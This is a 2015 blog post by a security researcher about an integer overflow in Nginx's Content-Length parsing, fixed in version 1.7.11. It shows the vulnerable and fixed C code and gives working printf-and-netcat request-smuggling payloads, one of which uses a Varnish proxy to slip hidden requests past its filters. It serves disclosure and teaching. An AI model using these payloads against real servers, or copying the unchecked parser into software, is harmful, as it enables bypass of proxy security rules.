---
layout: post
uuid: 91e11e2b-c5ed-34f5-e5a6-64ebc000cf44
title: Nginx Integer Truncation
categories: [Security, English]
tags: [Drupal, Security, Apache, PHP]
pic: long_name2.jpg
excerpt: Exploitation of Integer Overflow with the HTTP Content length Header
---

<small> **English version** (**Version Française** disponible sur [makina corpus][FRENCH].)</small>

## Nginx 1.7.11

A new 1.7.11 version of Nginx has just been released (24-03-2015) and if you look at the [CHANGES file][NGINX_CHANGES] you can see this:

        *) Bugfix: in integer overflow handling.
               Thanks to Régis Leroy.

yes, that's me :-), the code diff is visible in [mercurial, here][MERCURIAL].

The real fix committed is better than the one I originally submitted. But the interesting fact is that this was an **integer overflow bug**. I do not think I were the first one to report this problem as, for example, on the openBSD httpd project documents like [this one][OPENBSD_HTTPD] we can read:

> It turned out that nginx uses many calls with the idiom malloc(num * size) and does not attempt to detect integer overflows (...)

Starting from this 1.7.11 version things should be better, but for all previous versions this could be used to make nasty things. To be honest I did not found any big issue exploiting it, but at least I've found one way of using it with the Content-Length HTTP header.

## For the record

I'm currently working on my spare time around several HTTP Smuggling tricks, searching for differences between web servers in the way they manage badly formatted HTTP. I'll made some reports of my findings later. To make it short, HTTP Smuggling attacks are based on hidden http queries, ways to hide full or partial http requests from some http agents in a chain, it can be used for cache poisoning, DOS or security bypass.

Anyway I was trying a set of bad-formatted http queries against Nginx, it was quite late -- well it was very late, something like 02:00 --. I should have been sleeping, and I was in fact starting to sleep on my keyboard.

I was trying to send requests with *simple* oneliners, on the command line, this way:

    printf 'POST /foo.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012Content-Type: application/x-www-form-urlencoded\015\012Content-Length : 15\015\012Content-Length:104\015\012\015\012GET /fic3.html?GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012GET /fic1.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012'| netcat 127.0.0.1 80

This one is rejected because it contains two Content-Length headers. Rejecting such requests is the base protection against HTTP smuggling.

Sleeping with a finger on the keyboard key '0', I ended-up sending that query (which is in fact only one query) -- if you wonder what are `\015` and `\012` they are the CR-CarriageReturn (\r) and LF-LineFeed (\n) ascii character, HTTP is like windows, it works with CRLF end of lines.--. I explode the oneliner on several lines for better readability:

    printf 'GET /fic1.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    'Content-Type: application/x-www-form-urlencoded\015\012'\
    'Content-Length:90000000000000000000000000000000000000000000000000000000000000015 \015\012'\
    '\015\012123456789012345'\
    'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    '\015\012'| netcat 127.0.0.1 80
    ----------------
    HTTP/1.1 200 OK
    Server: nginx/1.2.1
    Date: Sat, 28 Feb 2015 18:22:18 GMT
    Content-Type: text/html
    Content-Length: 41
    Last-Modified: Sun, 08 Feb 2015 23:51:13 GMT
    Connection: keep-alive
    Accept-Ranges: bytes

    <html><body><H1>FIRST</H1></body></html>
    HTTP/1.1 200 OK
    Server: nginx/1.2.1
    Date: Sat, 28 Feb 2015 18:22:18 GMT
    Content-Type: text/html
    Content-Length: 42
    Last-Modified: Sun, 08 Feb 2015 23:51:33 GMT
    Connection: keep-alive
    Accept-Ranges: bytes

    <html><body><H1>SECOND</H1></body></html>

Nginx responded to that query, it did not send me a "413" response, and I was awake enough to realize it. I have two valid responses for 1 single query.

With a shorter Content-length you have the right behavior (an error 413):

    printf 'GET /fic1.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    'Content-Type: application/x-www-form-urlencoded\015\012'\
    'Content-Length:90000015 \015\012'\
    '\015\012123456789012345'\
    'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    '\015\012'| netcat 127.0.0.1 80
    -----------
    HTTP/1.1 413 Request Entity Too Large
    Server: nginx/1.2.1
    Date: Wed, 25 Mar 2015 17:39:49 GMT
    Content-Type: text/html
    Content-Length: 198
    Connection: close
    
    <html>
    <head><title>413 Request Entity Too Large</title></head>
    <body bgcolor="white">
    <center><h1>413 Request Entity Too Large</h1></center>
    <hr><center>nginx/1.2.1</center>
    </body>
    </html>

The request sent is:

    1 - GET /fic1.html HTTP/1.1[CR][LF]
    2 - Host: www.dummy-host.example.com[CR][LF]
    3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
    4 - Content-Length:900000000000000000000000000000000000000000000000000000015 [CR][LF]
    5 - [CR][LF]
    6 - 123456789012345GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
    7 - Host: www.dummy-host.example.com[CR][LF]
    8 - [CR][LF]

This is a GET request containing a Body (line 6 to 8) (something unusual, usually only POST queries should send body parts). The fact we have two responses for this request means Nginx is reading this request like a pipeline of two or more requests, this way:

    # Request 1: a GET query with a body of size 15
    1 - GET /fic1.html HTTP/1.1[CR][LF]
    2 - Host: www.dummy-host.example.com[CR][LF]
    3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
    4 - Content-Length: 15 [CR][LF]
    5 - [CR][LF]
    6 - 123456789012345 #<----------- this is 15 bytes
    # Request 2: another request
    6 - GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
    7 - Host: www.dummy-host.example.com[CR][LF]
    8 - [CR][LF]

## Integer Overflow truncation

We have this 900000000000000000000000000000000000000000000000000000015 read as 15, this is usually an integer overflow bug.
A bunch of functions in nginx could lead to such overflows, `ngx_atoi`, `ngx_atofp`, `ngx_atosz`, `ngx_atoof`, `ngx_atotm` and `ngx_hextoi`.
If I remember well, the one used for the Content-Length header parsing is `ngx_atosz`.

Let's analyze one of the functions before the fix:

{% highlight c %}
    size_t
    ngx_atosz(u_char *line, size_t n)
    {
        ssize_t value;
   
        if (n == 0) {
            return NGX_ERROR;
        }
   
        for (value = 0; n--; line++) {
            if (*line < '0' || *line > '9') {
                return NGX_ERROR;
            }
   
            value = value * 10 + (*line - '0');
        }
   
        if (value < 0) {
            return NGX_ERROR;
   
        } else {
            return value;
        }
    }
{% endhighlight %}

The goal is to transform a text containing a number, like "15" to a number, 15. `line` contains the string and `n` is the string length. The `(*line < '0' || *line > '9')` test ensure each character of the line is really a digit.

For each character the final number is computed by doing a `* 10` with the previous compute value and then adding the digit.

But with long strings of digits, comes a time when doing a ` * 10` in the C code makes your number smaller, because you hit the maximum value, with signed integers your result is at first a negative integer. When you'll hit the limit a second time you may end up with short positive values, and loop on the allowed ranges, or maybe not, the behavior is **unknown**, it depends on the compiler, the OS, etc.

On my own tests, one a local server, I was able to obtain a 15 quite easily with a string number containing a lot of '0' -- like the thing obtained by accident--. I don't really know why. somewhere in the loop `value` comes to 0, one thing is sure, when you bypass the limits strange things happens.

Remember that the final result may depend on your architecture:

    request Content-length / parsed Content Length
    '10'                   => 10
    '9224000000000000000'  => -9222744073709551616
    '36893488147419103231' => -1
    '36893488147419103232' => 0
    '36893488147419103233' => 1
    '36893488147419103247' => 15
    '368934881474191032320000000000015' => 15
    '3689348814741910323200000000000000000015' => 15
    '36893488147419104005' => 773
    '36893488147420000005' => 896773
    '90000000000000000000000000000000000000000000000000000' => -5507902344274116608
    '900000000000000000000000000000000000000000000000000000' => 261208778387488768
    '9000000000000000000000000000000000000000000000000000000' => 2612087783874887680
    '90000000000000000000000000000000000000000000000000000000' => 7674133765039325184
    '900000000000000000000000000000000000000000000000000000000' => 2954361355555045376
    '9000000000000000000000000000000000000000000000000000000000' => -7349874591868649472
    '90000000000000000000000000000000000000000000000000000000000' => 288230376151711744
    '900000000000000000000000000000000000000000000000000000000000000' => 4611686018427387904
    '9000000000000000000000000000000000000000000000000000000000000000' => -9223372036854775808
    '9999999999999999999999999999999999999999999991000000000000000000' => -9000000000000000000
    '9999999999999999999999999999999999999999999999900000000000000000' => -100000000000000000
    '9999999999999999999999999999999999999999999999990000000000000000' => -10000000000000000
    '9999999999999999999999999999999999999999999999999999999999999990' => -10
    '90000000000000000000000000000000000000000000000000000000000000000' => 0
    '90000000000000000000000000000000000000000000000000000000000000015' => 15
    '900000000000000000000000000000000000000000000000000000000000000000000000015' => 15

The fixed version of this same function (my own proposal was a return as soon as `value` was lower than previous value in the for loop):

{% highlight c %}
    ssize_t
    ngx_atosz(u_char *line, size_t n)
    {
        ssize_t value, cutoff, cutlim;
   
        if (n == 0) {
            return NGX_ERROR;
        }
   
        cutoff = NGX_MAX_SIZE_T_VALUE / 10;
        cutlim = NGX_MAX_SIZE_T_VALUE % 10;
   
        for (value = 0; n--; line++) {
            if (*line < '0' || *line > '9') {
                return NGX_ERROR;
            }
    
            if (value >= cutoff && (value > cutoff || *line - '0' > cutlim)) {
                return NGX_ERROR;
            }
    
            value = value * 10 + (*line - '0');
        }
    
        return value;
    }
{% endhighlight %}

## Example of exploitation Varnish + Nginx

To exploit this integer truncation we have to send a very-very-very big content-length header, so big that we cannot really send such a big query (for example 36893488147419103232, the first 0, is 32 768 Petabytes); and we need to get the request body transferred to nginx without a buffering proxy (because we cannot wait for a full request buffering, we need the proxy to send the request to nginx while still receiving inputs). This can be done using Varnish (at least, they may be others). An Apache mod_proxy server would reject such a big Content-Length header, but not Varnish.

We need a proxy because the basics of an HTTP Smuggling attack is precisely to have differences in the interpretation of the request by two actors, here the varnish proxy as first actor and the Nginx backend as the second one.

Now when Nginx will receive this request from the Varnish proxy it will read a completely different and shorter Content-Length Header, and this means we can hide new HTTP requests in the transferred request body. Something than the proxy did not saw as a request.

Note that we will never receive the results from that hidden query, and that we will have to close the initial query (because the number of bytes to transfer is too high). So there is no way of poisoning the reverse proxy cache (here Varnish). The only usage of such exploit is to bypass security rules that could be written in Varnish and forgotten in Nginx and use that to send a request where the result as no importance. A good defense in depth policy would enforce rewriting in Nginx security rules defined in the proxy, but if it is not the case this technique could be used to **transfer a blind unfiltered request to Nginx** (blind because you will never get the response).

This is the reason why this issue is not considered "serious" by the Nginx project. Alone this flaw is not very useful... but mighty oaks from little acorns grow.

You could try something like that (here with varnish on port 8080 on 127.0.0.1, with nginx as a backend, and with a POST query containing two hidden queries in the body), try it only at home:

    printf 'POST /could_fail.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    'Content-Type: application/x-www-form-urlencoded\015\012'\
    'Content-length: 9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000015\015\012'\
    '\015\012123456789012345GET /hidden.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    '\015\012'\
    'POST /could_fail.html HTTP/1.1\015\012'\
    'Host: www.dummy-host.example.com\015\012'\
    'Content-Type: application/x-www-form-urlencoded\015\012'\
    'Content-Length: 1048570\015\012'\
    'etc..aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    '(... here a quite long filler, something like 500 characters at least because we need varnish'\
    'to start transmission of the body and this requires some inputs...)aaaaaaaaaaaaaaaaaaaaaaaaaaa'\
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'| netcat 127.0.0.1 8080

You can try it with a wireshark and see that Nginx respond to all the queries (or you can check the access logs).

I did not found any malloc error associated with theses integers overflows, but you are free to search that.

My own conclusion would be: C, how is this still a thing :-)

More seriously I find distressing that most web servers are still sensitive to low-level C errors like integer overflows, null strings, etc.

 * [Stay tuned on twitter, @regilero][TWITTER], [@makinacorpus][TWITTERMAK]

[MERCURIAL]: http://hg.nginx.org/nginx/rev/15a15f6ae3a2
[FRENCH]: http://makina-corpus.com/blog/metier/2015/debordement-dentiers-dans-nginx-fixe-en-1-7-11
[NGINX_CHANGES]: http://nginx.org/en/CHANGES
[OPENBSD_HTTPD]: http://www.openbsd.org/papers/httpd-asiabsdcon2015.pdf
[TWITTER]: https://twitter.com/regilero
[TWITTERMAK]: https://twitter.com/makinacorpus

